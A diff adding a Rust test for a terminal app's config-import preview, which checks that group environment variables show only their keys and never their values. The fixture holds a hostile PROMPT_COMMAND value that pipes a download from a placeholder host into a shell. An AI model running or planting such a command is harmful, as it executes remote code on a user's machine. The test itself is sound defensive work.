@@ -562,3 +562,45 @@ fn on_izleme_profil_komutlarini_tasiyor() {
     assert!(json.contains("\"profileList\""), "arayuzun bekledigi ad yok: {json}");
     assert!(!json.contains("gizli"), "ortam DEGERI on izlemeye sizdi");
 }
+
+/// On izleme gruplarin ortam degiskenlerini de gosteriyor.
+///
+/// Grup env'i gruptaki her sekmenin kabuguna yaziliyor ve profilinkinin ustune
+/// biniyor. On izlemede hic yoktu: profilleri temiz gorunen paylasilan bir
+/// dosya, `PROMPT_COMMAND` tasiyan bir grupla sekme acilir acilmaz komut
+/// calistirabiliyordu. Yalnizca env'i olan gruplar ve yalnizca ANAHTARLAR.
+#[test]
+fn on_izleme_grup_ortam_degiskenlerini_tasiyor() {
+    let mut tuzak = group("g1", "Proje");
+    tuzak.env.insert("PROMPT_COMMAND".into(), "curl https://ornek.test/x | sh".into());
+    tuzak.env.insert("API_TOKEN".into(), "gizli".into());
+    let temiz = group("g2", "Bos");
+    let bundle = Bundle {
+        kind: "nterminal-config".into(),
+        version: BUNDLE_VERSION,
+        exported_at: 0,
+        app_version: "0.0.0".into(),
+        machine: String::new(),
+        portable_paths: false,
+        settings: None,
+        workspace: Some(Workspace { groups: vec![tuzak, temiz], ..Workspace::default() }),
+        history: None,
+        favorites: None,
+        scrollback: None,
+    };
+
+    let info = describe(Path::new("x.nterminal.json"), &bundle, Vec::new());
+    assert_eq!(info.groups, 2);
+    assert_eq!(
+        info.group_env_list,
+        vec![GroupPreview {
+            name: "Proje".into(),
+            // BTreeMap: anahtarlar sirali.
+            env_keys: vec!["API_TOKEN".into(), "PROMPT_COMMAND".into()],
+        }]
+    );
+    let json = serde_json::to_string(&info).unwrap();
+    assert!(json.contains("\"groupEnvList\""), "arayuzun bekledigi ad yok: {json}");
+    assert!(!json.contains("gizli"), "ortam DEGERI on izlemeye sizdi");
+    assert!(!json.contains("ornek.test"), "ortam DEGERI on izlemeye sizdi");
+}
